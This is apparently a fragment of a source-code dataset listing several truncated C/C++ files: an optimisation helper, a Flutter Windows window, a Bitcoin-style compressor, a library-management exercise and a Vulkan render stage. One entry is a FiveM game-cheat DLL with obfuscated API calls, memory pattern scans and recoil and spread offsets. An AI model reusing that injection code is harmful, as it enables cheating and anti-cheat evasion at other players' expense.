EITHER\n * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT. THE\n * AUTHOR SHALL NOT BE LIABLE FOR ANY DAMAGES SUFFERED BY ANYONE AS A RESULT OF\n * USING, MODIFYING OR DISTRIBUTING THIS SOFTWARE OR ITS DERIVATIVES.\n *\n */\n\n#include \"partial_solution.h\"\n\npartial_solution_t::partial_solution_t(int num_touched_variables) {\n    this->num_touched_variables = num_touched_variables;\n    this->touched_variables = vec(num_touched_variables, fill::none);\n    this->sample_zs = zeros<vec>(num_touched_variables);\n    objective_value = 1e308;\n    constraint_value = 1e308;\n}\n\npartial_solution_t::partial_solution_t(vec touched_variables, std::vector<int> &touched_indices) {\n    this->num_touched_variables = touched_variables.n_elem;\n    this->touched_indices = touched_indices;\n    this->touched_variables = touched_variables;\n    this->sample_zs = zeros<vec>(num_touched_variables);\n    objective_value = 1e308;\n    constraint_value = 1e308;\n}\n\npartial_solution_t::partial_solution_t(vec touched_variables, vec sample_zs, std::vector<int> &touched_indices) {\n    this->num_touched_variables = touched_variables.n_elem;\n    this->touched_indices = touched_indices;\n    this->touched_variables = touched_variables;\n    this->sample_zs = sample_zs;\n    objective_value = 1e308;\n    constraint_value = 1e308;\n}\n\npartial_solution_t::partial_solution_t(partial_solution_t &other) {\n    this->num_touched_variables = other.num_touched_variables;\n    for (int i = 0; i < num_touched_variables; i++)\n        this->touched_indices.push_back(other.touched_indices[i]);\n    this->touched_variables = other.touched_variables;\n    this->sample_zs = other.sample_zs;\n    objective_value = other.objective_value;\n    constraint_value = other.constraint_value;\n}\n\nint partial_solution_t::getTouchedIndex(int ind) {\n    if (touched_index_map.empty()) {\n        for (int i = 0; i < num_touched_variables; i++)\n            touched_index_map[touched_indices[i]] = i;\n    }\n\n    auto map_ind = touched_index_map.find(ind);\n    if (map_ind == touched_index_map.end())\n        return (-1);\n    else\n        return map_ind->second;\n}\n\nvoid partial_solution_t::setSampleMean(vec means) {\n    this->sample_means = means;\n}\n\nvoid partial_solution_t::print() {\n    for (int i = 0; i < num_touched_variables; i++)\n        printf(\"[%d][%6.3e]\", touched_indices[i], touched_variables[i]);\n}\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// Copyright (c) 2009-2010 Satoshi Nakamoto\n// Copyright (c) 2009-2014 The Bitcoin Core developers\n// Copyright (c) 2017-2019 The Raven Core developers\n// Copyright (c) 2020 The IoTlinkChain Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include \"compressor.h\"\n\n#include \"hash.h\"\n#include \"pubkey.h\"\n#include \"script/standard.h\"\n\nbool CScriptCompressor::IsToKeyID(CKeyID &hash) const\n{\n    if (script.size() == 25 && script[0] == OP_DUP && script[1] == OP_HASH160\n                            && script[2] == 20 && script[23] == OP_EQUALVERIFY\n                            && script[24] == OP_CHECKSIG) {\n        memcpy(&hash, &script[3], 20);\n        return true;\n    }\n    return false;\n}\n\nbool CScriptCompressor::IsToScriptID(CScriptID &hash) const\n{\n    if (script.size() == 23 && script[0] == OP_HASH160 && script[1] == 20\n                            && script[22] == OP_EQUAL) {\n        memcpy(&hash, &script[2], 20);\n        return true;\n    }\n    return false;\n}\n\nbool CScriptCompressor::IsToPubKey(CPubKey &pubkey) const\n{\n    if (script.size() == 35 && script[0] == 33 && script[34] == OP_CHECKSIG\n                            && (script[1] == 0x02 || script[1] == 0x03)) {\n        pubkey.Set(&script[1], &script[34]);\n        return true;\n    }\n    if (script.size() == 67 && script[0] == 65 && script[66] == OP_CHECKSIG\n                            && script[1] == 0x04) {\n        pubkey.Set(&script[1], &script[66]);\n        return pubkey.IsFullyValid(); // if not fully valid, a case that would not be compressible\n    }\n    return false;\n}\n\nbool CScriptCompressor::Compress(std::vector<unsigned char> &out) const\n{\n    CKeyID keyID;\n    if (IsToKeyID(keyID)) {\n        out.resize(21);\n        out[0] = 0x00;\n        memcpy(&out[1], &keyID, 20);\n        return true;\n    }\n    CScriptID scriptID;\n    if (IsToScriptID(scriptID)) {\n        out.resize(21);\n        out[0] = 0x01;\n        memcpy(&out[1], &scriptID, 20);\n        return true;\n    }\n    CPubKey pubkey;\n    if (IsToPubKey(pubkey)) {\n        out.resize(33);\n        memcpy(&out[1], &pubkey[1], 32);\n        if (pubkey[0] == 0x02 || pubkey[0] == 0x03) {\n            out[0] = pubkey[0];\n            return true;\n        } else if (pubkey[0] == 0x04) {\n            out[0] = 0x04 | (pubkey[64] & 0x01);\n            return true;\n        }\n    }\n    return false;\n}\n\nunsigned int CScriptCompressor::GetSpecialSize(unsigned int nSize) const\n{\n    if (nSize == 0 || nSize == 1)\n        return 20;\n    if (nSize == 2 || nSize == 3 || nSize == 4 || nSize == 5)\n        return 32;\n    return 0;\n}\n\nbool CScriptCompressor::Decompress(unsigned int nSize, const std::vector<unsigned char> &in)\n{\n    switch(nSize) {\n    case 0x00:\n        script.resize(25);\n        script[0] = OP_DUP;\n        script[1] = OP_HASH160;\n        script[2] = 20;\n        memcpy(&script[3], in.data(), 20);\n        script[23] = OP_EQUALVERIFY;\n        script[24] = OP_CHECKSIG;\n        return true;\n    case 0x01:\n        script.resize(23);\n        script[0] = OP_HASH160;\n        script[1] = 20;\n        memcpy(&script[2], in.data(), 20);\n        script[22] = OP_EQUAL;\n        return true;\n    case 0x02:\n    case 0x03:\n        script.resize(35);\n        script[0] = 33;\n        script[1] = nSize;\n        memcpy(&script[2], in.data(), 32);\n        script[34] = OP_CHECKSIG;\n        return true;\n    case 0x04:\n    case 0x05:\n        unsigned char vch[33] = {};\n        vch[0] = nSize - 2;\n        memcpy(&vch[1], in.data(), 32);\n        CPubKey pubkey(&vch[0], &vch[33]);\n        if (!pubkey.Decompress())\n            return false;\n        assert(pubkey.size() == 65);\n        script.resize(67);\n        script[0] = 65;\n        memcpy(&script[1], pubkey.begin(), 65);\n        script[66] = OP_CHECKSIG;\n        return true;\n    }\n    return false;\n}\n\n// Amount compression:\n// * If the amount is 0, output 0\n// * first, divide the amount (in base units) by the largest power of 10 possible; call the exponent e (e is max 9)\n// * if e<9, the last digit of the resulting number cannot be 0; store it as d, and drop it (divide by 10)\n//   * call the result n\n//   * output 1 + 10*(9*n + d - 1) + e\n// * if e==9, we only know the resulting number is not zero, so output 1 + 10*(n - 1) + 9\n// (this is decodable, as d is in [1-9] and e is in [0-9])\n\nuint64_t CTxOutCompressor::CompressAmount(uint64_t n)\n{\n    if (n == 0)\n        return 0;\n    int e = 0;\n    while (((n % 10) == 0) && e < 9) {\n        n /= 10;\n        e++;\n    }\n    if (e < 9) {\n        int d = (n % 10);\n        assert(d >= 1 && d <= 9);\n        n /= 10;\n        return 1 + (n*9 + d - 1)*10 + e;\n    } else {\n        return 1 + (n - 1)*10 + 9;\n    }\n}\n\nuint64_t CTxOutCompressor::DecompressAmount(uint64_t x)\n{\n    // x = 0  OR  x = 1+10*(9*n + d - 1) + e  OR  x = 1+10*(n - 1) + 9\n    if (x == 0)\n        return 0;\n    x--;\n    // x = 10*(9*n + d - 1) + e\n    int e = x % 10;\n    x /= 10;",
    "#include <iostream>\n#include <string>\n#include <utility>\n#include <vector>\n\nclass Carte\n{\nprivate:\n    std::string nume;\n    std::string autor;\n    int numarPagini;\n    int nrZileMaxImprumut;\n\npublic:\n    Carte(std::string nume, std::string _autor, int _numarPagini, int _numarZileImprumut) : nume(std::move(nume)), autor(std::move(_autor))\n    {\n        numarPagini = _numarPagini;\n        nrZileMaxImprumut = _numarZileImprumut;\n    }\n    Carte(const Carte &other) : nume(other.nume), autor(other.autor)\n    {\n        numarPagini = other.numarPagini;\n        nrZileMaxImprumut = other.nrZileMaxImprumut;\n    }\n    Carte &operator=(const Carte &other)\n    = default;\n    bool operator==(const Carte &other) const\n    {\n        return (nume == other.nume) && (autor == other.autor) && (numarPagini == other.numarPagini);\n    }\n    friend std::ostream &operator<<(std::ostream &os, const Carte &carte)\n    {\n        os << \"Numele cartii este \" << carte.nume << \", autorul ei este \" << carte.autor << \", cu numar de pagini : \" << carte.numarPagini << '\\n';\n        os << \"Numarul de zile pana cand cartea trebuie sa fie returnata este\" << carte.nrZileMaxImprumut << '\\n';\n        return os;\n    }\n    ~Carte() = default;\n\n    std::string numeCarte()\n    {\n        return nume;\n    }\n    /*\n    std::string numeAutor()\n    {\n        return autor;\n    }\n\n    [[nodiscard]] int numarPaginiCarte() const\n    {\n        return numarPagini;\n    }\n     */\n    [[nodiscard]] int maxImprumut() const\n    {\n        return nrZileMaxImprumut;\n    }\n};\n\nclass Bibliotecar\n{\nprivate:\n    std::string nume;\n    int numarGestiune{};\n    std::vector<Carte> gestiuneCarti; /// cartile pentru care bibliotecarul este responsabil\npublic:\n    Bibliotecar()\n    = default;\n\n    [[maybe_unused]] explicit Bibliotecar(std::string _nume) : nume(std::move(_nume))\n    {\n        numarGestiune = 0;\n        gestiuneCarti.clear();\n    }\n    Bibliotecar(const Bibliotecar &other) : nume(other.nume),  gestiuneCarti(other.gestiuneCarti)\n    {\n        numarGestiune = other.numarGestiune;\n    }\n    Bibliotecar &operator=(const Bibliotecar &other)\n    = default;\n    [[nodiscard]] std::string afiseazaNume() const\n    {\n        return nume;\n    }\n    friend std::ostream &operator<<(std::ostream &os, const Bibliotecar &bibliotecar)\n    {\n        os << \"Numele bibliotecarului este \" << bibliotecar.nume << \", care are in gestiune \" << bibliotecar.numarGestiune << \" carti.\" << '\\n';\n        os << \"Cartile pe care acesta le are in gestiune sunt : \" << '\\n';\n        for (Carte it : bibliotecar.gestiuneCarti)\n        {\n            os << it.numeCarte() << '\\n';\n        }\n        return os;\n    }\n    ~Bibliotecar() = default;\n\n    std::vector<Carte> CartileDinGestiune()\n    {//aaa\n        return gestiuneCarti;\n    }\n    void imprumutaCarte(unsigned idx)\n    {\n        numarGestiune--;\n        gestiuneCarti.erase(gestiuneCarti.begin() + idx);\n    }\n    void adaugaCarte(Carte &carte)\n    {\n        numarGestiune++;\n        gestiuneCarti.push_back(carte);\n    }\n};\n\nclass SalaDeLectura\n{\nprivate:\n    std::string nume;\n    Bibliotecar bibliotecar;\n    int numarCarti;\n    std::vector<Carte> cartiDeCitit;\n\npublic:\n\n    SalaDeLectura(std::string _nume, int _numarCarti, const Bibliotecar& _bibliotecar) : nume(std::move(_nume)), bibliotecar(_bibliotecar)\n    {\n        numarCarti = _numarCarti;\n    }\n\n    SalaDeLectura(const SalaDeLectura &other) : nume(other.nume), bibliotecar(other.bibliotecar), cartiDeCitit(other.cartiDeCitit)\n    {\n        numarCarti = other.numarCarti;\n    }\n\n    SalaDeLectura &operator=(const SalaDeLectura &other)\n    = default;\n\n    void adaugaCarte(const Carte &carte)\n    {\n        cartiDeCitit.push_back(carte);\n    }\n\n    ~SalaDeLectura() = default;\n\n    friend std::ostream &operator<<(std::ostream &os, const SalaDeLectura &saladelectura)\n    {\n        os << \"Numele salii de lectura este \" << saladelectura.nume << \", bibliotecarul responsabil este \" << saladelectura.bibliotecar.afiseazaNume() << \" care este responsabil de \" << saladelectura.numarCarti << \" carti\" << '\\n';\n        os << \"Cartile din sala de lectura sunt urmatoarele: \";\n        for (Carte it : saladelectura.cartiDeCitit)\n        {\n            os << it.numeCarte() << '\\n';\n        }\n        return os;\n    }\n    std::string numeSalaDeLectura()\n    {\n        return nume;\n    }\n};\n\nclass Biblioteca\n{\nprivate:\n    std::string nume;\n    int numarCarti;\n    int numarBibliotecari;\n    std::vector<SalaDeLectura> salaDeLectura;\n\npublic:///\n    Biblioteca(std::string _nume, int _numarCarti, int _numarBibliotecari, std::vector<SalaDeLectura> _saladelectura):\n    nume(std::move(_nume)), salaDeLectura(std::move(_saladelectura))\n    {\n        numarCarti = _numarCarti;\n        numarBibliotecari = _numarBibliotecari;\n    }\n    Biblioteca(const Biblioteca &other) : nume(other.nume), salaDeLectura(other.salaDeLectura)\n    {\n        numarCarti = other.numarCarti;\n        numarBibliotecari = other.numarBibliotecari;\n    }\n    Biblio",
    "#include \"geometry_stage.h\"\n\n#include \"engine/engine.h\"\n#include \"engine/commands/command_util.h\"\n\nGeometryStage::GeometryStage(const std::shared_ptr<Engine>& engine, const std::shared_ptr<VoxelRenderSettings>& settings, const std::shared_ptr<VoxelScene>& scene) : AVoxelRenderStage(engine, settings), _scene(scene)\n{\n    _parametersBuffer = std::make_unique<Buffer>(engine, sizeof(VolumeParameters), vk::BufferUsageFlagBits::eUniformBuffer, VMA_MEMORY_USAGE_CPU_TO_GPU, \"G-Pass Parameters Buffer\");\n    _parametersBuffer->copyData(&_parameters, sizeof(VolumeParameters));\n\n    uint32_t recreatorId = engine->recreationQueue->push(RecreationEventFlags::RENDER_RESIZE, [&]() {\n        glm::uvec2 renderRes = settings->renderResolution();\n\n        _colorTarget = std::make_unique<RenderImage>(engine, renderRes.x, renderRes.y, vk::Format::eR8G8B8A8Unorm,\n                                   vk::ImageUsageFlagBits::eColorAttachment | vk::ImageUsageFlagBits::eSampled, vk::ImageAspectFlagBits::eColor, \"Color Target\");\n        _depthTarget = std::make_unique<RenderImage>(engine, renderRes.x, renderRes.y, vk::Format::eR32Sfloat,\n                                   vk::ImageUsageFlagBits::eColorAttachment | vk::ImageUsageFlagBits::eSampled, vk::ImageAspectFlagBits::eColor, \"Depth Target\");\n        _motionTarget = std::make_unique<RenderImage>(engine, renderRes.x, renderRes.y, vk::Format::eR32G32Sfloat,\n                                    vk::ImageUsageFlagBits::eColorAttachment | vk::ImageUsageFlagBits::eSampled, vk::ImageAspectFlagBits::eColor, \"Motion Target\");\n        _maskTarget = std::make_unique<RenderImage>(engine, renderRes.x, renderRes.y, vk::Format::eR8Unorm,\n                                  vk::ImageUsageFlagBits::eColorAttachment | vk::ImageUsageFlagBits::eSampled, vk::ImageAspectFlagBits::eColor, \"Mask Target\");\n        _positionTargets = ResourceRing<RenderImage>::fromArgs(2, engine, renderRes.x, renderRes.y, vk::Format::eR32G32B32A32Sfloat,\n                                                               vk::ImageUsageFlagBits::eColorAttachment | vk::ImageUsageFlagBits::eSampled, vk::ImageAspectFlagBits::eColor, \"Position Target\");\n        _normalTarget = std::make_unique<RenderImage>(engine, renderRes.x, renderRes.y, vk::Format::eR8G8B8A8Snorm,\n                                    vk::ImageUsageFlagBits::eColorAttachment | vk::ImageUsageFlagBits::eSampled, vk::ImageAspectFlagBits::eColor, \"Normal Target\");\n\n        return [=](const std::shared_ptr<Engine>&) {\n            _colorTarget->destroy();\n            _depthTarget->destroy();\n            _maskTarget->destroy();\n            _maskTarget->destroy();\n            _positionTargets.destroy([=](const RenderImage& image) {\n                image.destroy();\n            });\n            _normalTarget->destroy();\n        };\n    });\n    pushDeletor([=](const std::shared_ptr<Engine>& delEngine) {\n        delEngine->recreationQueue->remove(recreatorId);\n    });\n\n    recreatorId = engine->recreationQueue->push(RecreationEventFlags::RENDER_RESIZE, [&]() {\n        _renderPass = RenderPassBuilder(engine)\n            .color(0, _colorTarget->format, glm::vec4(0.0))\n            .color(1, _depthTarget->format, glm::vec4(0.0))\n            .color(2, _motionTarget->format, glm::vec4(0.0))\n            .color(3, _maskTarget->format, glm::vec4(0.0))\n            .color(4, _positionTargets[0].format, glm::vec4(0.0))\n            .color(5, _normalTarget->format, glm::vec4(0.0))\n            .buildUnique(\"Geometry Render Pass\");\n\n        return [=](const std::shared_ptr<Engine>&) {\n            _renderPass->destroy();\n        };\n    });\n    pushDeletor([=](const std::shared_ptr<Engine>& delEngine) {\n        delEngine->recreationQueue->remove(recreatorId);\n    });\n\n    recreatorId = engine->recreationQueue->push(RecreationEventFlags::RENDER_RESIZE, [&]() {\n        _framebuffers = ResourceRing<Framebuffer>::fromFunc(2, [&](uint32_t n) {\n            return FramebufferBuilder(engine, _renderPass->renderPass, settings->renderResolution())\n                .color(_colorTarget->imageView)\n                .color(_depthTarget->imageView)\n                .color(_motionTarget->imageView)\n                .color(_maskTarget->imageView)\n                .color(_positionTargets[n].imageView)\n                .color(_normalTarget->imageView)\n                .build(\"Geometry Framebuffer\");\n        });\n\n        return [=](const std::shared_ptr<Engine>&) {\n            _framebuffers.destroy([&](const Framebuffer& framebuffer) {\n                framebuffer.destroy();\n            });\n        };\n    });\n    pushDeletor([=](const std::shared_ptr<Engine>& delEngine) {\n        delEngine->recreationQueue->remove(recreatorId);\n    });\n\n    _pipeline = std::make_unique<VoxelSDFPipeline>(VoxelSDFPipeline::build(engine, _renderPass->renderPass));\n\n    recreatorId = engine->recreationQueue->push(RecreationEventFlags::RENDER_RESIZE, [&]() {\n        